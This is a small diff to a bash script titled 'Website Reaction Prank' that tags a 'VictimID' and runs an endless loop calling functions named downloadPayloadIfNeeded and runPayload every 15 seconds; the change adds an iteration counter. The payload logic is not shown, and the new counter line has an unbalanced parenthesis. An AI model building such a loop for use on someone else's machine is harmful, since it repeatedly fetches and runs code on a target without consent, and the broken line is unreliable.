@@ -106,12 +106,20 @@ echo "# Website Reaction Prank         "
 echo "# VictimID: $victim              "
 echo "#################################"
 
+iteration=1
+
 while [ true ]; do
+
+  echo "###################################"
+  echo "Iteration $iteration"
+  echo ""
 
   downloadPayloadIfNeeded
 
   runPayload
 
   sleep 15
+
+  let iteration=$((iteration+1)
 
 done
